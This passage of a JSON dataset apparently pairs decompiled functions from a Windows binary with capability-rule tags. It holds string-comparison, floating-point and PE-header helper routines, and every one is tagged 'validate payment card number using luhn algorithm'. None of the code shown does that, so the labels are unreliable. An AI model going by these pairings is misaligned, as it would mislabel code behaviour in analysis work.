iVar1, 0, 0, 0, 0, 0);\n                if (iVar3 != 0) {\n                    if ((arg_10h & 0x400) == 0) {\n                        uVar2 = iVar3 * 2 + 8;\n                        uVar2 = -(iVar3 * 2 < uVar2) & uVar2;\n                        if (uVar2 == 0) {\n                            arg_18h_01 = NULL;\n                        }\n                        else if (uVar2 < 0x401) {\n                            fcn.00476f20();\n                            if (*0x10 != 0x3c) {\ncode_r0x0046e36f:\n                                arg_18h_01 = puVar5 + 2;\n                                if ((arg_18h_01 != NULL) &&\n                                   (iVar4 = fcn.0046078f(arg_ch, arg_10h, arg_18h_00, iVar1, arg_18h_01, iVar3, 0, 0, 0)\n                                   ,  iVar4 != 0)) {\n                                    if (arg_20h == 0) {\n                                        arg_20h = 0;\n                                        arg_1ch = 0;\n                                    }\n                                    iVar3 = fcn.00463192(arg_24h, 0, arg_18h_01, iVar3, arg_1ch, arg_20h, 0, 0);\n                                    if (iVar3 != 0) {\n                                        fcn.00466884(arg_18h_01);\n                                        goto code_r0x0046e3cf;\n                                    }\n                                }\n                            }\n                        }\n                        else {\n                            arg_18h_01 = fcn.0045d1bf(uVar2);\n                            if (arg_18h_01 != NULL) {\n                                *arg_18h_01 = 0xdddd;\n                                puVar5 = arg_18h_01;\n                                goto code_r0x0046e36f;\n                            }\n                        }\n                        fcn.00466884(arg_18h_01);\n                    }\n                    else if ((arg_20h != 0) && (iVar3 <= arg_20h)) {\n                        fcn.0046078f(arg_ch, arg_10h, arg_18h_00, iVar1, arg_1ch, arg_20h, 0, 0, 0);\n                    }\n                }\n            }\n        }\n    }\n    else {\n        arg_18h_00 = fcn.0045d1bf(uVar2);\n        if (arg_18h_00 != NULL) {\n            *arg_18h_00 = 0xdddd;\n            goto code_r0x0046e2ae;\n        }\n    }\ncode_r0x0046e3cf:\n    fcn.00466884(arg_18h_00);\ncode_r0x0046e3d8:\n    fcn.004303e9(iVar1);\n    return;\n}\n",
        "token_count": 1299
    },
    "0047017f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047017f(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar1 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            if (uVar1 - 0x41 < 0x1a) {\n                uVar1 = uVar1 + 0x20;\n            }\n            uVar2 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            if (uVar2 - 0x41 < 0x1a) {\n                uVar2 = uVar2 + 0x20;\n            }\n        } while (((uVar1 - uVar2 == 0) && (uVar1 != 0)) && (arg_10h = arg_10h + -1,  arg_10h != 0));\n        return uVar1 - uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 250
    },
    "0046f0d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046f0d7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0046f10e(arg_8h, arg_ch, arg_10h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 104
    },
    "0046fedb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046fedb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0046f89c(arg_8h, arg_ch, arg_10h, 0xffffffff, arg_14h, 0);\n    return arg_10h;\n}\n",
        "token_count": 76
    },
    "0046ff1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046ff1d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0046f97e(arg_8h, arg_ch, arg_10h, 0xffffffff, arg_14h, 0);\n    return arg_10h;\n}\n",
        "token_count": 77
    },
    "0046ff5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046ff5f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0046f739(arg_8h, arg_ch, 0xffffffff, arg_10h, 0);\n    return arg_ch;\n}\n",
        "token_count": 63
    },
    "0046ff9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046ff9b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0046f7e0(arg_8h, arg_ch, 0xffffffff, arg_10h, 0);\n    return arg_ch;\n}\n",
        "token_count": 65
    },
    "0046ffd7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ffd7(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    do {\n        uVar1 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar1 = uVar1 + 0x20;\n        }\n        uVar2 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        if (uVar2 - 0x41 < 0x1a) {\n            uVar2 = uVar2 + 0x20;\n        }\n    } while ((uVar1 == uVar2) && (uVar1 != 0));\n    return;\n}\n",
        "token_count": 187
    },
    "0047051d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0047051d(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00471501(*arg_8h);\n    fcn.0047157c(arg_8h[1]);\n    var_8h = 0;\n    var_4h = 0;\n    iVar1 = fcn.00470500(&var_8h);\n    if ((iVar1 == 0) && (*arg_8h == var_8h)) {\n        bVar2 = arg_8h[1] != var_4h;\n    }\n    else {\n        bVar2 = true;\n    }\n    return bVar2;\n}\n",
        "token_count": 176
    },
    "0047185f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047185f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.004716ae(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00471dfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00471dfe(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.00471a1e(arg_8h, arg_ch, arg_10h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "00471e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00471e40(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.00471c54(arg_8h, arg_ch, arg_10h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "00471e82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00471e82(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    ulong uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.00471b2f(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 113
    },
    "00471ec2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471ec2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00471b2f(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 76
    },
    "00471ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00471ee0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    ulong uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.00471cb1(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "00471f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471f20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00471cb1(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 75
    },
    "0047320d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047320d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_14h);\n    uVar1 = fcn.00473046(arg_8h, arg_ch, arg_10h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 108
    },
    "00473245": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00473245(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_1ch);\n    uVar1 = fcn.00472f6a(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "00473283": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00473283(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.00473046(arg_8h, arg_ch, arg_10h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "004732ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004732ba(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.00472f6a(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 123
    },
    "0047488d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047488d(int32_t param_1, int32_t *param_2, uint16_t *param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint in_stack_ffffff68;\n    uint32_t uStack148;\n    uchar auStack144 [48];\n    ulong uStack96;\n    uint32_t uStack80;\n    uint32_t uStack20;\n    \n    uStack20 = *0x6cade0 ^ &stack0xfffffff0;\n    uStack148 = *param_3;\n    iVar2 = *param_2;\n    if (iVar2 == 1) {\ncode_r0x004748fb:\n        arg_8h = 8;\ncode_r0x004748fd:\n        iVar2 = fcn.00474c08(arg_8h, param_2 + 6, uStack148);\n        if (iVar2 == 0) {\n            if (((param_1 == 0x10) || (param_1 == 0x16)) || (param_1 == 0x1d)) {\n                uStack96 = *(param_2 + 4);\n                uStack80 = uStack80 & 0xffffffe3 | 3;\n            }\n            else {\n                uStack80 = uStack80 & 0xfffffffe;\n            }\n            fcn.00474e95(auStack144, &uStack148, arg_8h, param_1, param_2 + 2, param_2 + 6);\n        }\n    }\n    else {\n        if (iVar2 == 2) {\n            arg_8h = 4;\n            goto code_r0x004748fd;\n        }\n        if (iVar2 == 3) {\n            arg_8h = 0x11;\n            goto code_r0x004748fd;\n        }\n        if (iVar2 == 4) {\n            arg_8h = 0x12;\n            goto code_r0x004748fd;\n        }\n        if (iVar2 == 5) goto code_r0x004748fb;\n        if ((iVar2 != 7) && (iVar2 == 8)) {\n            arg_8h = 0x10;\n            goto code_r0x004748fd;\n        }\n    }\n    fcn.00470454(uStack148, 0xffff);\n    if (*param_2 != 8) {\n        cVar1 = fcn.0045879e();\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.004587ca(param_2);\n            if (iVar2 != 0) goto code_r0x0047498a;\n        }\n    }\n    fcn.004751cc(*param_2);\ncode_r0x0047498a:\n    fcn.004303e9(in_stack_ffffff68);\n    return;\n}\n",
        "token_count": 630
    },
    "004751fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.004751fd(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    do {\n        if (*(iVar1 * 8 + 0x484200) == arg_ch) {\n            var_1ch = *(iVar1 * 8 + 0x484204);\n            if (var_1ch != 0) {\n                var_18h = arg_10h;\n                var_14h = arg_14h;\n                var_10h = arg_18h;\n                var_ch = arg_1ch;\n                var_8h = arg_20h;\n                var_20h = arg_8h;\n                var_4h = arg_24h;\n                fcn.00470454(arg_28h, 0xffff);\n                iVar1 = fcn.004587ca(&var_20h);\n                if (iVar1 == 0) {\n                    fcn.004751cc(arg_8h);\n                }\n                return CONCAT44(var_4h, var_8h);\n            }\n            goto code_r0x0047521d;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x1d);\n    var_1ch = 0;\ncode_r0x0047521d:\n    fcn.00470454(arg_28h, 0xffff);\n    fcn.004751cc(arg_8h);\n    return CONCAT44(arg_24h, arg_20h);\n}\n",
        "token_count": 437
    },
    "004755ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.004755ea(double param_1)\n\n{\n    double dVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    float10 fVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = fcn.00470454(0x133f, 0xffff);\n    uVar4 = param_1 >> 0x20;\n    if ((param_1._6_2_ & 0x7ff0) == 0x7ff0) {\n        iVar2 = fcn.0047540a(SUB84(param_1, 0), uVar4);\n        if ((iVar2 == 1) || (iVar2 == 2)) {\n            fcn.00470454(arg_8h, 0xffff);\n            return param_1;\n        }\n        if (iVar2 == 3) {\n            return param_1;\n        }\n        dVar1 = *0x4839b0 + param_1;\n        uVar5 = SUB84(dVar1, 0);\n        uVar6 = dVar1 >> 0x20;\n        uVar4 = 8;\n    }\n    else {\n        if (param_1 != 0.0) {\n            fcn.004752cc(SUB84(param_1, 0), uVar4, &var_4h);\n            fcn.00470454(arg_8h, 0xffff);\n            return var_4h + -1;\n        }\n        uVar5 = SUB84(-*0x484388, 0);\n        uVar6 = -*0x484388 >> 0x20;\n        uVar4 = 4;\n    }\n    fVar3 = fcn.00474a32(uVar4, 0x25, param_1, uVar5, uVar6, arg_8h);\n    return fVar3;\n}\n",
        "token_count": 440
    },
    "004756ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004756ba(ulong param_1, ulong param_2)\n\n{\n    fcn.004758e6(param_1, param_2);\n    return;\n}\n",
        "token_count": 40
    },
    "004756f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004756f3(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    float10 fVar2;\n    ushort uVar3;\n    uint16_t uVar4;\n    uint uVar5;\n    double dVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    double dStack16;\n    int32_t var_4h;\n    \n    arg_8h = fcn.00470454(0x133f, 0xffff);\n    uVar4 = noname_1 >> 0x10;\n    uVar3 = noname_1;\n    dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n    uVar7 = dVar6 >> 0x20;\n    if ((uVar4 & 0x7ff0) == 0x7ff0) {\n        iVar1 = fcn.0047540a(noname_0, uVar7);\n        if ((iVar1 == 1) || (iVar1 == 2)) {\ncode_r0x004757a8:\n            fcn.00470454(arg_8h, 0xffff);\n            return CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n        }\n        if (iVar1 == 3) {\n            fVar2 = fcn.00474e88(noname_0, CONCAT26(uVar4, CONCAT24(uVar3, noname_0)) >> 0x20, SUB84(arg_10h, 0));\n            fcn.00470454(arg_8h, 0xffff);\n            goto code_r0x00475793;\n        }\n        dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n        uVar9 = SUB84(*0x4839b0 + dVar6, 0);\n        uVar10 = *0x4839b0 + dVar6 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n        uVar5 = 8;\n        goto code_r0x004758da;\n    }\n    if (dVar6 == 0.0) goto code_r0x004757a8;\n    fVar2 = fcn.004752cc(noname_0, uVar7, &var_4h);\n    if (arg_10h < 0) {\n        if (var_4h < -0x80000000 - arg_10h) {\ncode_r0x00475839:\n            uVar9 = SUB84(0 * fVar2, 0);\n            uVar10 = 0 * fVar2 >> 0x20;\ncode_r0x0047584e:\n            uVar7 = SUB84(arg_10h, 0);\n            uVar8 = arg_10h >> 0x20;\n            dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n            uVar5 = 0x12;\n            goto code_r0x004758da;\n        }\ncode_r0x004757f0:\n        var_4h = var_4h + arg_10h;\n        if (0xa00 < var_4h) goto code_r0x004758a8;\n        if (var_4h < 0x401) {\n            if (var_4h < -0x9fd) goto code_r0x00475839;\n            if (-0x3fe < var_4h) {\n                fVar2 = fcn.004753dd(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h);\n                fcn.00470454(arg_8h, 0xffff);\ncode_r0x00475793:\n                dStack16 = fVar2;\n                return dStack16;\n            }\n            fVar2 = fcn.004753dd(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h + 0x600);\n            uVar9 = SUB84(fVar2, 0);\n            uVar10 = fVar2 >> 0x20;\n            goto code_r0x0047584e;\n        }\n        fVar2 = fcn.004753dd(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h + -0x600);\n        uVar9 = SUB84(fVar2, 0);\n        uVar10 = fVar2 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n    }\n    else {\n        if (var_4h <= 0x7fffffff - arg_10h) goto code_r0x004757f0;\ncode_r0x004758a8:\n        fVar2 = fcn.004754b6(*0x484388, *0x484388 >> 0x20, SUB84(fVar2, 0), fVar2 >> 0x20);\n        uVar9 = SUB84(fVar2, 0);\n        uVar10 = fVar2 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n    }\n    dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n    uVar5 = 0x11;\ncode_r0x004758da:\n    fVar2 = fcn.00474b00(uVar5, 0x19, dVar6, uVar7, uVar8, uVar9, uVar10, arg_8h);\n    return fVar2;\n}\n",
        "token_count": 1316
    },
    "004758e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004758e6(ulong param_1)\n\n{\n    fcn.00475905(param_1, param_1 >> 0x20);\n    return;\n}\n",
        "token_count": 40
    },
    "00475905": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00475905(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint64_t uVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    ushort uVar5;\n    double in_stack_0000000c;\n    double dStack12;\n    \n    dStack12 = _arg_8h;\n    iVar2 = fcn.00475dac(arg_8h);\n    if (iVar2 == 2) goto code_r0x00475a60;\n    iVar3 = fcn.00475e2a(SUB84(in_stack_0000000c, 0));\n    if ((iVar3 == 2) || (in_stack_0000000c == _arg_8h)) {\n        dStack12 = in_stack_0000000c;\n        goto code_r0x00475a60;\n    }\n    uVar5 = 1;\n    if (iVar2 == 1) {\n        _arg_8h = 1.39067116124321e-309;\n        uVar4 = arg_ch._2_2_ & 0xffef | 0x7fef;\n        uVar5 = 0xffff;\ncode_r0x0047599f:\n        _arg_8h = CONCAT62(_arg_8h >> 0x10 & 0xffffffff | (uVar4 << 0x30) >> 0x10, uVar5);\n    }\n    else {\n        if (iVar2 == 0) {\n            if (((in_stack_0000000c < _arg_8h) << 8 | (in_stack_0000000c == _arg_8h) << 0xe) == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = 0x8000;\n            }\n            goto code_r0x0047599f;\n        }\n        if (((((in_stack_0000000c < _arg_8h) << 8 | (in_stack_0000000c == _arg_8h) << 0xe) == 0) && (0.0 < _arg_8h)) ||\n           ((in_stack_0000000c < _arg_8h && (((0.0 < _arg_8h) << 8 | (_arg_8h == 0.0) << 0xe) == 0)))) {\n            uVar1 = _arg_8h & 0xffffffffffff0000;\n            _arg_8h = uVar1 | arg_8h + 1U;\n            if (arg_8h + 1U == 0) {\n                arg_8h._2_2_ = uVar1 >> 0x10;\n                uVar1 = arg_8h._2_2_ + 1U << 0x10;\n                _arg_8h = arg_ch << 0x20 | uVar1;\n                if (arg_8h._2_2_ + 1U == 0) {\n                    arg_8h = uVar1;\n                    _arg_8h = CONCAT24(arg_ch + 1, arg_8h);\n                    uVar1 = arg_ch << 0x20 & 0xffff000000000000;\n                    _arg_8h = uVar1 | _arg_8h;\n                    if (arg_ch + 1 == 0) {\n                        arg_ch._2_2_ = uVar1 >> 0x30;\n                        _arg_8h = CONCAT26(arg_ch._2_2_ + 1, _arg_8h);\n                        if ((arg_ch._2_2_ + 1 & 0x7fff) == 0x7ff0) {\n                            fcn.00475d75(8);\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            uVar1 = _arg_8h & 0xffffffffffff0000;\n            _arg_8h = uVar1 | arg_8h - 1U;\n            if (arg_8h - 1U == 0xffff) {\n                arg_8h._2_2_ = uVar1 >> 0x10;\n                arg_8h = CONCAT22(arg_8h._2_2_ + -1, 0xffff);\n                if (arg_8h._2_2_ + -1 == -1) {\n                    _arg_8h = CONCAT24(arg_ch + -1, arg_8h);\n                    uVar1 = (arg_ch & 0xffff0000) << 0x20;\n                    _arg_8h = uVar1 | _arg_8h;\n                    if (arg_ch + -1 == -1) {\n                        arg_ch._2_2_ = uVar1 >> 0x30;\n                        _arg_8h = CONCAT26(arg_ch._2_2_ + -1, _arg_8h);\n                    }\n                }\n            }\n        }\n    }\n    dStack12 = _arg_8h;\ncode_r0x00475a60:\n    if ((dStack12 & 0x7ff0000000000000) == 0) {\n        fcn.00475d75(0x10);\n    }\n    return dStack12;\n}\n",
        "token_count": 1160
    },
    "004764d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004764d0(char *arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    \n    if (*(*0x40003c + 0x4000e4) != 0) {\n        iVar6 = *(*0x40003c + 0x4000e0) + 0x400000;\n        iVar3 = *(*(*0x40003c + 0x4000e0) + 0x400004);\n        while (iVar3 != 0) {\n            pcVar7 = iVar3 + 0x400000;\n            pcVar4 = pcVar7;\n            do {\n                cVar2 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar2 != '\\0');\n            pcVar4 = pcVar4 + (-1 - pcVar7);\n            pcVar5 = arg_8h;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if (pcVar4 == pcVar5 + (-1 - arg_8h)) {\n                pcVar5 = arg_8h;\n                if (pcVar4 == NULL) {\n                    return iVar6;\n                }\n                for (; (pcVar4 = pcVar4 + -1,  pcVar4 != NULL && (*pcVar5 == *pcVar7)); pcVar5 = pcVar5 + 1) {\n                    pcVar7 = pcVar7 + 1;\n                }\n                if (*pcVar5 == *pcVar7) {\n                    return iVar6;\n                }\n            }\n            piVar1 = iVar6 + 0x24;\n            iVar6 = iVar6 + 0x20;\n            iVar3 = *piVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 450
    },
    "00476ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00476ac0(int16_t *arg_8h)\n\n{\n    if ((*arg_8h == 0x5a4d) && (*(*(arg_8h + 0x1e) + arg_8h) == 0x4550)) {\n        return *(*(arg_8h + 0x1e) + arg_8h + 6) == 0x10b;\n    }\n    return false;\n}\n",
        "token_count": 103
    },
    "00477037": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00477037(void)\n\n{\n    unkint10 in_ST0;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (in_ST0 < 0) {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n    }\n    else {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n        if ((uStack28 < 0) && (uStack24 < 0x401f)) {\n            return uStack28 >> (0x3eU - uStack24 & 0x1f);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 196
    },
    "0047719e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0047719e(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    unkint10 in_ST0;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    uStack32 = in_ST0;\n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (in_ST0 < 0) {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n    }\n    else {\n        if (uStack24 < 0x3fff) {\n            return 0;\n        }\n        if ((uStack28 < 0) && (uStack24 < 0x403f)) {\n            uVar1 = 0x3e - uStack24;\n            uVar2 = uStack28;\n            if (0x1f < uVar1) {\n                uVar2 = 0;\n                uStack32 = uStack28;\n            }\n            return CONCAT44(uVar2 >> (uVar1 & 0x1f), uStack32 >> (uVar1 & 0x1f) | uVar2 << 0x20 - (uVar1 & 0x1f));\n        }\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 317
    },
    "0047734e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
